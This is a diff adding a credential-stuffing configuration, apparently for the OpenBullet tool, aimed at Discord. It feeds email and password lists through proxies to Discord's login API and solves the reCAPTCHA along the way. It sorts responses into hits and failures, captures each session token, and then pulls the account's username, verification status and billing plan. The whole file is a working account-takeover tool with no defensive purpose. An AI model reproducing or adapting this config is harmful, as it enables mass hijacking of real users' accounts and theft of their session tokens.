@@ -1,0 +1,68 @@
+[SETTINGS]
+{
+  "Name": "Discord",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-12T17:51:05.7705315+00:00",
+  "AdditionalInfo": "",
+  "Author": "Choempie",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Email_Request REQUEST POST "https://discordapp.com/api/v6/auth/login" AutoRedirect=TRUE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"undelete\":false,\"captcha_key\":null}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Super-Properties: eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwicmVmZXJyZXIiOiJodHRwczovL3d3dy5nb29nbGUuY28udWsvIiwicmVmZXJyaW5nX2RvbWFpbiI6Ind3dy5nb29nbGUuY28udWsiLCJzZWFyY2hfZW5naW5lIjoiZ29vZ2xlIiwicmVmZXJyZXJfY3VycmVudCI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5ubC8iLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiJ3d3cuZ29vZ2xlLm5sIiwic2VhcmNoX2VuZ2luZV9jdXJyZW50IjoiZ29vZ2xlIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTUxNTR9" 
+#Keycheck RECAPTCHA "https://discordapp.com/login" "6Lef5iQTAAAAAKeIvIY-DeexoO3gj7ryl9rLMEnn" -> VAR "rcap" 
+#Login REQUEST POST "https://discordapp.com/api/v6/auth/login" AutoRedirect=TRUE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"undelete\":false,\"captcha_key\":\"<rcap>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Super-Properties: eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwicmVmZXJyZXIiOiJodHRwczovL3d3dy5nb29nbGUuY28udWsvIiwicmVmZXJyaW5nX2RvbWFpbiI6Ind3dy5nb29nbGUuY28udWsiLCJzZWFyY2hfZW5naW5lIjoiZ29vZ2xlIiwicmVmZXJyZXJfY3VycmVudCI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5ubC8iLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiJ3d3cuZ29vZ2xlLm5sIiwic2VhcmNoX2VuZ2luZV9jdXJyZW50IjoiZ29vZ2xlIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTUxNTR9" 
+#Recaptchaaaaaaaaaa KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "token" 
+  KEYCHAIN Failure OR 
+    KEY "Password does not match" 
+    KEY "Email does not exist" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "mfa\": true" 
+#Token_cap PARSE "<SOURCE>" JSON "token" Recursive=FALSE -> VAR "token" "" "" 
+#Token_cap PARSE "<SOURCE>" JSON "token" Recursive=FALSE -> CAP "Token" "" "" 
+#Request_/me REQUEST GET "https://discordapp.com/api/v6/users/@me" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: <token>" 
+#User_cap PARSE "<SOURCE>" JSON "username" Recursive=FALSE -> CAP "" "" "" 
+#Discrim_cap PARSE "<SOURCE>" JSON "discriminator" Recursive=FALSE -> CAP "#" "" "" 
+#Verified_cap PARSE "<SOURCE>" JSON "verified" Recursive=FALSE -> CAP "Verified?" "" "" 
+#Request_billing REQUEST GET "https://discordapp.com/api/v6/users/@me/billing" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: <token>" 
+#billing_cap PARSE "<SOURCE>" JSON "plan" Recursive=FALSE -> CAP "Plan" "" "" 
